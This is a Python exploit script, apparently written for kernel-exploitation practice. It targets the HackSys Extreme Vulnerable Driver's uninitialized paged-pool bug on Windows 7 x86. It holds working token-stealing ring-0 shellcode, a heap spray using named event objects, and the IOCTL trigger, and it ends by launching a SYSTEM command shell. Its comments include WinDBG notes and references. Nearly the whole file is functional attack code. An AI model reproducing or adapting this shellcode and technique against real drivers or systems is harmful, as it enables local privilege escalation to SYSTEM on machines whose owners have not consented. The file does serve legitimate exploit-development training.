# -*- coding: utf-8 -*-
import sys
import struct
import os
import ctypes 

from ctypes import *
from ctypes.wintypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32

def debug_print(message):
    """debug_debug_prints message in terminal and debugger"""

    print(message)
    kernel32.OutputDebugStringA(message + "\n")


def getLastError():
    """Format GetLastError"""
    
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        debug_print("\n[-] ERR:  " + str(buf.value))
    else:
        debug_print("Unknown Error")
    

def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """

    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
        

def _ret_shellcode_buffer():
    """Payload memory allocation in user-land"""

    shellcode = (
        #---[Debug]
        "\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad		
        "\xC3"                          # ret
    )
    
    shellcode_address = id(shellcode) + 0x14
    success = kernel32.VirtualProtect(
	    shellcode_address, 
	    c_int(len(shellcode)), 
	    c_int(0x40), 
	    byref(c_long())
    )

    if success == 0x0:
        print("\t[-] Failed to change memory protection.")
        sys.exit(-1)

    return shellcode_address, len(shellcode)

def _send_payload(payload_ptr, payload_len, code):
    """Interacting with the driver"""
    
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    # Recreate CTL_CODE macro to generate driver IOCTL 
    ctl_code = (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )

    # Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code,           # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return kernel32.CloseHandle(handle)


def _heap_spray(lp_name):
    """ Create PIPES (w/ RWX permissions) for Heap Spraying technique """
 
    create_event_array_1 = []
    #debug_print("[*] Allocating [256] CreateEventA Objects")
    for i in range(256):
       create_event_array_1.append(
           kernel32.CreateEventW(
               None,
               False, 
               False, 
               c_char_p(lp_name))
        )

    #debug_print("[*] Freeing Objects in order to create non-paged pools holes")
    for i in xrange(0, len(create_event_array_1), 1):
        kernel32.CloseHandle(create_event_array_1[i])
	    
    return create_event_array_1

def _exploit(code):
    """Execute exploit in order to get nt-authority/SYSTEM shell"""
    
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer() # shellcode virtual allocation
    debug_print("\n[+] Pointer for ring0 shellcode: 0x%x" % (shellcode_ptr))

    # lp_name = "A" * 0xe8
    """

    0: kd> g
    Breakpoint 2 hit
    HEVD!TriggerUninitializedMemoryPagedPool+0x206:
    988c3c96 8b4204          mov     eax,dword ptr [edx+4]
    0: kd> dps edx+4
    930d1f14  41414141
    930d1f18  41414141
    930d1f1c  41414141
    930d1f20  41414141
    930d1f24  41414141
    930d1f28  41414141
    930d1f2c  41414141
    """

    lp_name = "AAAA" # fake header
    lp_name += struct.pack("<L", shellcode_ptr) * ((0xe8 - 4) / 4) # call eax=[shellcode_ptr]

    create_event_array_1 = _heap_spray(lp_name) # spray the heap 
                                         # (increase your chances to hit a controlled addr after free())

    payload_ptr = struct.pack("<L", 0xdeadbeef) # trigger vulnerability
    payload_len = len(payload_ptr)

    # send custom payload
    _send_payload(
        payload_ptr,
        payload_len,
        code
    )
    
    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    os.system("start cmd.exe")

if __name__ == "__main__":
    """
    REFERENCES
        https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UninitializedMemoryPagedPool.c
        https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/

    IOCTL to trigger TriggerUninitializedMemoryPagedPool in win7 x86
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h

    Usefull WinDBG commands:
        .sympath c:\symbols;c:\hevd
        .reload /f *.*
        ed nt!Kd_Default_Mask 8
        .load pykd
        .load grep
        bp HEVD!TriggerUninitializedMemoryPagedPool
        bp HEVD!TriggerUninitializedMemoryPagedPool+0x209
        r; dps edx+4
        g
    """
    code = 0x80C # HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL - IOCTL(0x80C)
    _exploit(code)
